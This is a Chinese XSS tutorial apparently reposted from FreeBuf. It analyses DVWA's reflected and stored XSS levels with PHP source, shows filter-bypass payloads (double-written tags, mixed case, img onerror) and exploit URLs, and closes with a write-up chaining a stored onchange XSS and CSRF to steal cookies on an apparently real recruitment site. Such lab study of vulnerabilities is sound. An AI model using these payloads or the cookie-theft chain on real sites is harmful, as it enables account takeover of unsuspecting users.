 
-

****XSS****
-----------

XSS，全称Cross Site Scripting，即跨站脚本攻击，某种意义上也是一种注入攻击，是指攻击者在页面中注入恶意的脚本代码，当受害者访问该页面时，恶意代码会在其浏览器上执行，需要强调的是，XSS不仅仅限于JavaScript，还包括flash等其它脚本语言。根据恶意代码是否存储在服务器中，XSS可以分为存储型的XSS与反射型的XSS。

DOM型的XSS由于其特殊性，常常被分为第三种，这是一种基于DOM树的XSS。例如服务器端经常使用document.boby.innerHtml等函数动态生成html页面，如果这些函数在引用某些变量时没有进行过滤或检查，就会产生DOM型的XSS。DOM型XSS可能是存储型，也有可能是反射型。

（注：下面的实验都是在Firefox浏览器下进行的，感谢火狐没做XSS filter）

****反射****型XSS****
------------------

下面对四种级别的代码进行分析。

### ****Low****

服务器端核心代码

```
<?php        
// Is there any input?        
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {        
    // Feedback for end user        
    echo '<pre>Hello ' . $_GET[ 'name' ] . '</pre>';        1
}        1
?>
```


可以看到，代码直接引用了name参数，并没有任何的过滤与检查，存在明显的XSS漏洞。

**漏洞利用**

输入<script>alert(/xss/)</script>，成功弹框：

[![1.png](http://image.3001.net/images/20161223/14824823248355.png!small)](http://image.3001.net/images/20161223/14824823248355.png)

相应的XSS链接：

[http://192.168.153.130/dvwa/vulnerabilities/xss\_r/?name=%3Cscript%3Ealert(/xss/)%3C%2Fscript%3E#](http://192.168.153.130/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%28/xss/%29%3C%2Fscript%3E#)

### ****Medium****

服务器端核心代码

```
<?php       
// Is there any input?       
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {       
    // Get input       
    $name = str_replace( '<script>', '', $_GET[ 'name' ] );       
    // Feedback for end user       
    echo "<pre>Hello ${name}</pre>";       
}       
?>
```


可以看到，这里对输入进行了过滤，基于黑名单的思想，使用str\_replace函数将输入中的<script>删除，这种防护机制是可以被轻松绕过的。

**漏洞利用**

1.双写绕过

输入<sc<script>ript>alert(/xss/)</script>，成功弹框：

![1.png](http://image.3001.net/images/20161223/14824824105236.png!small)

相应的XSS链接

[http://192.168.153.130/dvwa/vulnerabilities/xss\_r/?name=%3Csc%3Cscript%3Eript%3Ealert%28%2Fxss%2F%29%3C%2Fscript%3E#](http://192.168.153.130/dvwa/vulnerabilities/xss_r/?name=%3Csc%3Cscript%3Eript%3Ealert%28%2Fxss%2F%29%3C%2Fscript%3E#)

2.大小写混淆绕过

输入<ScRipt>alert(/xss/)</script>，成功弹框：

![1.png](http://image.3001.net/images/20161223/14824824446366.png!small)

相应的XSS链接：

[http://192.168.153.130/dvwa/vulnerabilities/xss\_r/?name=%3CScRipt%3Ealert(%2Fxss%2F)%3C%2Fscript%3E](http://192.168.153.130/dvwa/vulnerabilities/xss_r/?name=%3CScRipt%3Ealert%28%2Fxss%2F%29%3C%2Fscript%3E#)

### **High**

服务器端核心代码

```
<?php       
// Is there any input?       
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {       
    // Get input       
    $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] );       
    // Feedback for end user       
    echo "<pre>Hello ${name}</pre>";       
}       
?>
```


可以看到，High级别的代码同样使用黑名单过滤输入，preg\_replace()函数用于正则表达式的搜索和替换，这使得双写绕过、大小写混淆绕过（正则表达式中i表示不区分大小写）不再有效。

**漏洞利用**

虽然无法使用<script>标签注入XSS代码，但是可以通过img、body等标签的事件或者iframe等标签的src注入恶意的js代码。

输入<img src=1 οnerrοr=alert(/xss/)>，成功弹框：

![1.png](http://image.3001.net/images/20161223/14824825209982.png!small)

相应的XSS链接：

[http://192.168.153.130/dvwa/vulnerabilities/xss\_r/?name=%3Cimg+src%3D1+onerror%3Dalert%28%2Fxss%2F%29%3E#](http://192.168.153.130/dvwa/vulnerabilities/xss_r/?name=%3Cimg+src%3D1+onerror%3Dalert%28%2Fxss%2F%29%3E#)

### **Impossible**

服务器端核心代码

```
<?php       
// Is there any input?       
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {       
    // Check Anti-CSRF token       
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );       
    // Get input       
    $name = htmlspecialchars( $_GET[ 'name' ] );       
    // Feedback for end user       
    echo "<pre>Hello ${name}</pre>";       1
}       1
// Generate Anti-CSRF token       1
generateSessionToken();       1
?>
```


可以看到，Impossible级别的代码使用htmlspecialchars函数把预定义的字符&、”、 ’、<、>转换为HTML实体，防止浏览器将其作为HTML元素。

**存储型XSS**

下面对四种级别的代码进行分析。

### **Low**

服务器端核心代码

```
<?php       
if( isset( $_POST[ 'btnSign' ] ) ) {       
    // Get input       
    $message = trim( $_POST[ 'mtxMessage' ] );       
    $name    = trim( $_POST[ 'txtName' ] );       
    // Sanitize message input       
    $message = stripslashes( $message );       
    $message = mysql_real_escape_string( $message );       
    // Sanitize name input       1
    $name = mysql_real_escape_string( $name );       1
    // Update database       1
    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";       1
    $result = mysql_query( $query ) or die( '<pre>' . mysql_error() . '</pre>' );       1
    //mysql_close();       1
}       1
?>
```


相关函数介绍

trim(string,charlist)

函数移除字符串两侧的空白字符或其他预定义字符，预定义字符包括、\\t、\\n、\\x0B、\\r以及空格，可选参数charlist支持添加额外需要删除的字符。

mysql\_real\_escape\_string(string,connection)

函数会对字符串中的特殊符号（\\x00，\\n，\\r，\\，‘，“，\\x1a）进行转义。

stripslashes(string)

函数删除字符串中的反斜杠。

可以看到，对输入并没有做XSS方面的过滤与检查，且存储在数据库中，因此这里存在明显的存储型XSS漏洞。

**漏洞利用**

message一栏输入<script>alert(/xss/)</script>，成功弹框：

[![1.png](http://image.3001.net/images/20161223/14824826941488.png!small)](http://image.3001.net/images/20161223/14824826941488.png)

name一栏前端有字数限制，抓包改为<script>alert(/name/)</script>：

[![1.png](http://image.3001.net/images/20161223/14824827265355.png!small)](http://image.3001.net/images/20161223/14824827265355.png)

成功弹框：

[![1.png](http://image.3001.net/images/20161223/14824827533689.png!small)](http://image.3001.net/images/20161223/14824827533689.png)

### **Medium**

服务器端核心代码

```
<?php       
if( isset( $_POST[ 'btnSign' ] ) ) {       
    // Get input       
    $message = trim( $_POST[ 'mtxMessage' ] );       
    $name    = trim( $_POST[ 'txtName' ] );       
    // Sanitize message input       
    $message = strip_tags( addslashes( $message ) );       
    $message = mysql_real_escape_string( $message );       
    $message = htmlspecialchars( $message );       1
    // Sanitize name input       1
    $name = str_replace( '<script>', '', $name );       1
    $name = mysql_real_escape_string( $name );       1
    // Update database       1
    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";       1
    $result = mysql_query( $query ) or die( '<pre>' . mysql_error() . '</pre>' );       1
    //mysql_close();       1
}       1
?>
```


相关函数说明

strip\_tags() 函数剥去字符串中的HTML、XML以及PHP的标签，但允许使用<b>标签。

addslashes() 函数返回在预定义字符（单引号、双引号、反斜杠、NULL）之前添加反斜杠的字符串。

可以看到，由于对message参数使用了htmlspecialchars函数进行编码，因此无法再通过message参数注入XSS代码，但是对于name参数，只是简单过滤了<script>字符串，仍然存在存储型的XSS。

**漏洞利用**

1.双写绕过

抓包改name参数为<sc<script>ript>alert(/xss/)</script>:

[![1.png](http://image.3001.net/images/20161223/14824828493990.png!small)](http://image.3001.net/images/20161223/14824828493990.png)

成功弹框：

[![1.png](http://image.3001.net/images/20161223/14824828893635.png!small)](http://image.3001.net/images/20161223/14824828893635.png)

2.大小写混淆绕过

抓包改name参数为<Script>alert(/xss/)</script>:

[![1.png](http://image.3001.net/images/20161223/14824829148314.png!small)](http://image.3001.net/images/20161223/14824829148314.png)

成功弹框：

[![1.png](http://image.3001.net/images/20161223/14824829417920.png!small)](http://image.3001.net/images/20161223/14824829417920.png)

### **High**

服务器端核心代码

```
<?php       
if( isset( $_POST[ 'btnSign' ] ) ) {       
    // Get input       
    $message = trim( $_POST[ 'mtxMessage' ] );       
    $name    = trim( $_POST[ 'txtName' ] );       
    // Sanitize message input       
    $message = strip_tags( addslashes( $message ) );       
    $message = mysql_real_escape_string( $message );       
    $message = htmlspecialchars( $message );       1
    // Sanitize name input       1
    $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $name );       1
    $name = mysql_real_escape_string( $name );       1
    // Update database       1
    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";       1
    $result = mysql_query( $query ) or die( '<pre>' . mysql_error() . '</pre>' );       1
    //mysql_close();       1
}       1
?>
```


可以看到，这里使用正则表达式过滤了<script>标签，但是却忽略了img、iframe等其它危险的标签，因此name参数依旧存在存储型XSS。

### **High**

抓包改name参数为<img src=1 οnerrοr=alert(1)>：

[![1.png](http://image.3001.net/images/20161223/14824830099169.png!small)](http://image.3001.net/images/20161223/14824830099169.png)

成功弹框：

[![1.png](http://image.3001.net/images/20161223/1482483036879.png!small)](http://image.3001.net/images/20161223/1482483036879.png)

### **Impossible**

服务器端核心代码

```
<?php       
if( isset( $_POST[ 'btnSign' ] ) ) {       
    // Check Anti-CSRF token       
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );       
    // Get input       
    $message = trim( $_POST[ 'mtxMessage' ] );       
    $name    = trim( $_POST[ 'txtName' ] );       
    // Sanitize message input       
    $message = stripslashes( $message );       1
    $message = mysql_real_escape_string( $message );       1
    $message = htmlspecialchars( $message );       1
    // Sanitize name input       1
    $name = stripslashes( $name );       1
    $name = mysql_real_escape_string( $name );       1
    $name = htmlspecialchars( $name );       1
    // Update database       1
    $data = $db->prepare( 'INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );' );       1
    $data->bindParam( ':message', $message, PDO::PARAM_STR );       1
    $data->bindParam( ':name', $name, PDO::PARAM_STR );       2
    $data->execute();       2
}       2
// Generate Anti-CSRF token       2
generateSessionToken();       2
?>
```


可以看到，通过使用htmlspecialchars函数，解决了XSS，但是要注意的是，如果htmlspecialchars函数使用不当，攻击者就可以通过编码的方式绕过函数进行XSS注入，尤其是DOM型的XSS。

**最后附赠最近遇到的一个实例：一次有趣的XSS+CSRF组合拳**

**0×01 前言**
-----------

最近执着于渗透各种xx人才网，前两天在某网站上发现了一个极其鸡肋的XSS漏洞，本来以为没有太大的利用价值，没想到结合CSRF攻击，却获得了意想不到的效果。

**0×02 一个鸡肋的XSS漏洞**
-------------------

下面是某个招聘网站的用户个人资料界面：

[![1.png](http://image.3001.net/images/20161223/14824831273109.png!small)](http://image.3001.net/images/20161223/14824831273109.png)

用户可以在这里修改自己的基本资料并保存，经过XSS测试，这里的输入都过滤了成对的尖括号（< >）、script、img、&等字符，但是似乎遗漏了事件，于是尝试使用input标签的onchange事件注入XSS代码。

在通讯地址一栏输入” οnchange=alert(2) “并保存，刷新页面，右键查看源码，注入成功：

[![1.png](http://image.3001.net/images/20161223/14824831591585.png!small)](http://image.3001.net/images/20161223/14824831591585.png)

只要尝试在通讯地址一栏中输入新的内容，就会触发XSS，弹框：

[![1.png](http://image.3001.net/images/20161223/14824831878367.png!small)](http://image.3001.net/images/20161223/14824831878367.png)

是的，成功触发XSS代码了，可是这个鸡肋的XSS漏洞有什么卵用呢？首先，这个XSS漏洞依赖事件触发，只有用户在修改个人资料时恶意代码才有可能执行，其次这是一个存储型的XSS漏洞，你不可能要求用户按照攻击者的意思，事先在自己的个人资料里键入XSS代码并保存吧。

**0×03 CSRF带来的曙光**
------------------

在修改个人资料的过程中，抓包发现这个修改接口并没有任何的防CSRF机制，存在明显的CSRF漏洞：

[![1.png](http://image.3001.net/images/20161223/14824832178645.png!small)](http://image.3001.net/images/20161223/14824832178645.png)

这给鸡肋的XSS漏洞带来了曙光，于是想到了可以结合CSRF攻击实现用户cookie的大面积盗取。攻击思路如下：

1.构造一个CSRF攻击页面，诱使用户访问（在这种招聘网站，发布一个包含恶意页面的虚假招聘很容易做到）

2.用户访问页面后，个人基本资料会被清空，同时注入XSS代码

3.用户尝试补全个人资料，触发XSS代码，自动发送cookie

**0×04 攻击演示**
-------------

下面是构造的CSRF攻击页面：

[![1.png](http://image.3001.net/images/20161223/14824853873264.png!small)](http://image.3001.net/images/20161223/14824853873264.png)

调皮地把cookie发（这里调皮地把cookie发给百度= =）

下面是本地的攻击过程演示：

1.受害者进入攻击页面，会看到“你的基本资料被我清空了”的提示：

[![1.png](http://image.3001.net/images/20161223/14824833969008.png!small)](http://image.3001.net/images/20161223/14824833969008.png)

还会看到资料修改成功的提示，并跳转：

[![1.png](http://image.3001.net/images/20161223/14824834206816.png!small)](http://image.3001.net/images/20161223/14824834206816.png)

2.这时候受害者会发现自己的个人资料被清空了：

[![1.png](http://image.3001.net/images/20161223/14824834508211.png!small)](http://image.3001.net/images/20161223/14824834508211.png)

却不知道已经被注入了XSS代码：

[![1.png](http://image.3001.net/images/20161223/14824834848133.png!small)](http://image.3001.net/images/20161223/14824834848133.png)

3.当用户尝试修改通讯地址一栏时，就会触发XSS代码，自动发送cookie（其中包含用户id、用户名、密码哈希值、session-id） ：

[![1.png](http://image.3001.net/images/20161223/14824835129534.png!small)](http://image.3001.net/images/20161223/14824835129534.png)

这样，大规模盗取用户cookie的攻击也就完成了。

****\*本文原创作者：lonehand****

****转自：[http://www.freebuf.com/articles/web/123779.html](http://www.freebuf.com/articles/web/123779.html)****